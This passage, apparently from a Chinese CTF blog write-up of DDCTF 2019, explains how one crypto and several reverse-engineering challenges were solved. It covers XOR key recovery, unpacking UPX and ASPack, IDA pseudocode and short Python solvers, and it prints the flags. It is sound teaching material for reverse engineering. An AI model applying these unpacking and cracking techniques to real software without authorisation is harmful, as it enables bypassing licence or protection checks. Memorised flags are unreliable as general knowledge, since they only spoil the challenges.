0c82033354e07ce236d694d02922a326b1f559370383b07</code></pre>
<p>提示原文是英文，最初的想法是通过词频来还原，写了段代码，简单统计了一下数据出现的次数，发现有159种二进制，应该不是简单的替换，猜测可能经过异或处理。此处祭出神器xortool，英文最多的必须是空格，那么以空格为参考进行爆破。</p>
<pre><code>F:\hack\tools\crypto\xortool-master\xortool
λ py -2 xortool -c " " X:\tmp\MulTzor
The most probable key lengths:
   3:   11.9%
   6:   19.7%
   9:   9.3%
  12:   14.5%
  15:   7.1%
  18:   11.2%
  21:   5.4%
  24:   8.4%
  30:   6.8%
  36:   5.7%
Key-length can be 3*n
2 possible key(s) of length 6:
\x0b\rz4\xaa\x12
N\rz4\xaa\x12
Found 2 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv</code></pre>
<p>直接爆出了key，进行xor即可还原明文。</p>
<pre><code>Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been "decisive" to the Allied victory.

The Enigma machines were a family of portable cipher machines with rotor scramblers. Good operating procedures, properly enforced, would have made the plugboard Enigma machine unbreakable. However, most of the German military forces, secret services and civilian agencies that used Enigma employed poor operating procedures, and it was these poor procedures that allowed the Enigma machines to be reverse-engineered and the ciphers to be read.

The German plugboard-equipped Enigma became Nazi Germany's principal crypto-system. It was broken by the Polish General Staff's Cipher Bureau in December 1932, with the aid of French-supplied intelligence material obtained from a German spy. A month before the outbreak of World War II, at a conference held near Warsaw, the Polish Cipher Bureau shared its Enigma-breaking techniques and technology with the French and British. During the German invasion of Poland, core Polish Cipher Bureau personnel were evacuated, via Romania, to France where they established the PC Bruno signals intelligence station with French facilities support. Successful cooperation among the Poles, the French, and the British at Bletchley Park continued until June 1940, when France surrendered to the Germans.

From this beginning, the British Government Code and Cypher School (GC&amp;CS) at Bletchley Park built up an extensive cryptanalytic capability. Initially, the decryption was mainly of Luftwaffe (German air force) and a few Heer (German army) messages, as the Kriegsmarine (German navy) employed much more secure procedures for using Enigma. Alan Turing, a Cambridge University mathematician and logician, provided much of the original thinking that led to the design of the cryptanalytical bombe machines that were instrumental in eventually breaking the naval Enigma. However, the Kriegsmarine introduced an Enigma version with a fourth rotor for its U-boats, resulting in a prolonged period when these messages could not be decrypted. With the capture of relevant cipher keys and the use of much faster US Navy bombes, regular, rapid reading of U-boat messages resumed.

The flag is: DDCTF{07b1b46d1db28843d1fd76889fea9b36}</code></pre>
<h2 data-content="1" id="f1206074e58c60ada78ac75a7c63b97c">RE</h2>
<h3 data-content="1" id="d89fd25c0e9d6f4745a4434baeedbf9d">Windows Reverse1</h3>
<p><strong>静态分析法</strong></p>
<p>使用peid进行检查，发现upx壳，<code>upx -d reverse1_final.exe</code>进行脱壳（脱壳后的exe在win10下不能运行，XP下可以运行），直接拖入IDA进行分析</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-804h]</span>
  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+5h] [ebp-803h]</span>
  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+404h] [ebp-404h]</span>
  <span class="kt">char</span> <span class="n">Dst</span><span class="p">;</span> <span class="c1">// [esp+405h] [ebp-403h]</span>

  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Dst</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3FFu</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3FFu</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"please input code:"</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
  <span class="n">sub_401000</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">,</span> <span class="s">"DDCTF{reverseME}"</span><span class="p">)</span> <span class="p">)</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"You've got it!!%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Try again later.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>主函数逻辑比较简单 ，把输入的字符串调用<code>sub_401000</code>函数进行处理，然后和 <code>DDCTF{reverseME}</code> 进行比较。</p>
<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">sub_401000</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// ebx</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">-</span> <span class="n">v1</span><span class="p">;</span>
    <span class="k">do</span>
    <span class="p">{</span>
      <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">byte_402FF8</span><span class="p">[(</span><span class="kt">char</span><span class="p">)</span><span class="n">v1</span><span class="p">[</span><span class="n">v4</span><span class="p">]];</span>
      <span class="o">++</span><span class="n">v2</span><span class="p">;</span>
      <span class="o">++</span><span class="n">v1</span><span class="p">;</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&lt;</span> <span class="n">result</span> <span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>双击跟进<code>byte_402FF8</code>发现并不存在，LXY大神的分析如下：</p>
<blockquote>
<p>翻看了下PE头中.rdata和.data的定义，发现.rdata的RVA是0x2000，内存大小为0x622，.data的RVA是0x3000。也就是说虚拟地址0x402000-0x402621是.rdata段。0x402622至0x402fff为未定义的内存空间（实际上内存页大小是0x1000，所以该端内存的会被默认填充为0）。但这不妨碍我们通过0x402ff8作为基址进行内存定位。翻了下.data段立马发现从0x403018开始为一个疑似转换表。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="n">a</span><span class="o">=</span><span class="s2">"~}|{zyxwvutsrqponmlkjihgfedcba`_^]</span><span class="se">\\</span><span class="s2">[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#</span><span class="se">\"</span><span class="s2">!"</span>
<span class="n">base</span><span class="o">=</span><span class="mh">0x402ff8</span>
<span class="n">table</span><span class="o">=</span><span class="mh">0x403018</span>
<span class="n">b</span><span class="o">=</span><span class="s2">"DDCTF{reverseME}"</span>
<span class="k">print</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="n">table</span><span class="o">-</span><span class="n">base</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">))])</span>  <span class="c1"># ZZ[JX#,9(9,+9QY!</span>
</pre></div>
<p><strong>动态调试法</strong></p>
<p>根据ida反汇编的伪代码，在<code>strcmp(&amp;v4, "DDCTF{reverseME}")</code>下断点</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134236-c53fe5c2-619c-1.png"/></p>
<p>可以根据输入和处理结果的映射关系，逆向还原flag</p>
<h3 data-content="1" id="ebdf44082a8eed64bc198fab67a761e5">Windows Reverse2</h3>
<p>使用peid进行检查，发现aspack壳，用<code>Aspack stripper</code>脱壳后拖入IDA</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">Dest</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-C04h]</span>
  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+9h] [ebp-C03h]</span>
  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+408h] [ebp-804h]</span>
  <span class="kt">char</span> <span class="n">Dst</span><span class="p">;</span> <span class="c1">// [esp+409h] [ebp-803h]</span>
  <span class="kt">char</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+808h] [ebp-404h]</span>
  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+809h] [ebp-403h]</span>

  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Dst</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3FFu</span><span class="p">);</span>
  <span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3FFu</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">Format</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="n">aS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">check_hex</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">aInvalidInput</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">sub_401240</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>                    <span class="c1">// decode('hex').encode('base64')</span>
  <span class="n">Dest</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3FFu</span><span class="p">);</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Dest</span><span class="p">,</span> <span class="n">aDdctfS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>                 <span class="c1">// DDCTF{%s}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Dest</span><span class="p">,</span> <span class="n">aDdctfReverse</span><span class="p">)</span> <span class="p">)</span>          <span class="c1">// DDCTF{reverse+}</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">aYouVeGotItS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Dest</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">aSomethingWrong</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>程序要求输入16进制，然后经过<code>sub_401240</code>处理后与<code>reverse+</code>比较，伪代码比较难看，还是直接用动态调试吧，继续在字符串比较处下一个断点。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134141-a4572636-619c-1.png"/></p>
<p>不难发现<code>sub_401240</code>函数将输入进行了hex解码和base64编码，直接逆向运算即可</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s1">'EjRWeJA='</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">)</span>
<span class="mi">1234567890</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="s2">"reverse+"</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"base64"</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span>
<span class="n">ADEBDEAEC7BE</span>
</pre></div>
<div class="highlight"><pre><span></span>&gt; X:<span class="se">\t</span>mp<span class="se">\r</span>everse2_final.exe
input code:ADEBDEAEC7BE
You<span class="err">'</span>ve got it !!! DDCTF<span class="o">{</span>reverse+<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="9fb6a10d1e7383f6f0ea626df4030130">Confused</h3>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="o">-</span><span class="p">[</span><span class="n">ViewController</span> <span class="nl">checkCode</span><span class="p">:](</span><span class="n">ViewController</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">SEL</span> <span class="n">a2</span><span class="p">,</span> <span class="n">id</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// ST18_8</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v11</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-58h]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-50h]</span>
  <span class="n">__int128</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-48h]</span>
  <span class="kr">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-38h]</span>
  <span class="n">SEL</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [rsp+60h] [rbp-30h]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v17</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-28h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v18</span><span class="p">;</span> <span class="c1">// [rsp+70h] [rbp-20h]</span>
  <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [rsp+78h] [rbp-18h]</span>
  <span class="kr">__int64</span> <span class="n">v20</span><span class="p">;</span> <span class="c1">// [rsp+80h] [rbp-10h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v21</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-8h]</span>

  <span class="n">v17</span> <span class="o">=</span> <span class="n">self</span><span class="p">;</span>
  <span class="n">v16</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
  <span class="n">v15</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">objc_storeStrong</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v15</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"pwd"</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">objc_retainAutoreleasedReturnValue</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="s">"stringValue"</span><span class="p">);</span>
  <span class="n">v14</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">objc_retainAutoreleasedReturnValue</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
  <span class="n">objc_release</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">objc_msgSend</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">,</span> <span class="s">"hasPrefix:"</span><span class="p">,</span> <span class="n">CFSTR</span><span class="p">(</span><span class="s">"DDCTF{"</span><span class="p">))</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">objc_msgSend</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">,</span> <span class="s">"length"</span><span class="p">);</span>
    <span class="n">v8</span> <span class="o">=</span> <span class="n">objc_msgSend</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">,</span> <span class="s">"substringFromIndex:"</span><span class="p">,</span> <span class="n">v7</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">v13</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">objc_retainAutoreleasedReturnValue</span><span class="p">(</span><span class="n">v8</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="s">"isEqualToString:"</span><span class="p">,</span> <span class="n">CFSTR</span><span class="p">(</span><span class="s">"}"</span><span class="p">))</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">objc_msgSend</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">,</span> <span class="s">"length"</span><span class="p">);</span>
      <span class="n">v19</span> <span class="o">=</span> <span class="mi">6LL</span><span class="p">;</span>
      <span class="n">v18</span> <span class="o">=</span> <span class="n">v9</span> <span class="o">-</span> <span class="mi">7</span><span class="p">;</span>
      <span class="n">v20</span> <span class="o">=</span> <span class="mi">6LL</span><span class="p">;</span>
      <span class="n">v21</span> <span class="o">=</span> <span class="n">v9</span> <span class="o">-</span> <span class="mi">7</span><span class="p">;</span>
      <span class="n">v10</span> <span class="o">=</span> <span class="n">objc_msgSend</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">,</span> <span class="s">"substringWithRange:"</span><span class="p">,</span> <span class="mi">6LL</span><span class="p">,</span> <span class="n">v9</span> <span class="o">-</span> <span class="mi">7</span><span class="p">);</span>
      <span class="n">v12</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">objc_retainAutoreleasedReturnValue</span><span class="p">(</span><span class="n">v10</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v12</span><span class="p">,</span> <span class="s">"length"</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mi">18</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v11</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">objc_retainAutorelease</span><span class="p">(</span><span class="n">v12</span><span class="p">);</span>
        <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="s">"UTF8String"</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">objc_storeStrong</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">objc_storeStrong</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sub_1000011D0</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"onSuccess"</span><span class="p">);</span>
    <span class="k">else</span>
      <span class="nf">objc_msgSend</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"onFailed"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">objc_msgSend</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"onFailed"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">objc_storeStrong</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v14</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">objc_storeStrong</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v15</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>找到成功的提示，往前一个函数为判断函数。函数内首先分配内存，初始化虚拟机，最后将输入去头尾后代入虚拟机，虚拟机将读入指令中存储的数据，加二，与输入比较，如失败，跳到最后，成功则执行下条指令，逻辑同上。故将指令中字符提取如下：fcjjmWmsEmrRfcDjye。</p>
<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_100001C60</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>

  <span class="n">result</span> <span class="o">=</span> <span class="n">rot2</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">result</span><span class="p">;</span>
  <span class="o">++*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>根据伪代码重写一个<code>rot2</code>函数即可</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">string</span>
<span class="n">a</span> <span class="o">=</span> <span class="s1">'fcjjmWmsEmrRfcDjye'</span>

<span class="k">def</span> <span class="nf">rot2</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">:</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">-</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="o">+</span><span class="mi">97</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">-</span><span class="mi">65</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="o">+</span><span class="mi">65</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>
<span class="k">print</span> <span class="n">rot2</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</pre></div>
<p>加入DDCTF{}后得到FLAG:</p>
<pre><code>DDCTF{helloYouGotTheFlag}</code></pre>
<h3 data-content="1" id="0892438e5b91e4b56b068a6dbb500e30">obfuscating macros</h3>
<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// al</span>
  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// al</span>
  <span class="kt">bool</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// al</span>
  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">char</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-40h]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-18h]</span>

  <span class="n">v9</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
